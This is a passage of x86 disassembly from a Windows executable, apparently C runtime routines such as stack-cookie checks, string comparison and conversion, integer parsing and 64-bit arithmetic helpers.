  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
